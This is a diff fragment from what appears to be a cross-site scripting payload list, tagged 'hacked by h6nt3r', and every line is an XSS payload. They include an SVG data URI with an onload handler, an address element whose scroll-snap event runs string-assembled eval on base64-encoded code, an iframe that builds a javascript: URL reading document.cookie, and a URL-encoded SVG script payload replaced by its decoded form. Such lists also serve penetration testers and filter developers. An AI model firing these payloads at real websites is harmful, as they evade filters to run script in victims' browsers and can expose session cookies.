@@ -169,4 +169,4 @@ javascript​:const originx="hacked by h6nt3r",var{a:onerror}={a:%2561lert};thro
 /svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" onload​="alert('XSS via SVG!')"><circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" /></svg>
 <address onscrollsnapchange=window['ev'+'a'+(['l','b','c'][0])](window['a'+'to'+(['b','c','d'][0])]('YWxlcnQob3JpZ2luKQ==')); style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></address>
 <<iframe/onload​='this["src"]="javas&Tab;cript​:al"+"ert(document.cookie)"';>
-%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cscript%3Eprompt%28%22XSS%22%29%3C%2Fscript%3E%3C%2Fsvg%3E
+<svg xmlns="http://www.w3.org/2000/svg"><script>prompt("XSS")</script></svg>
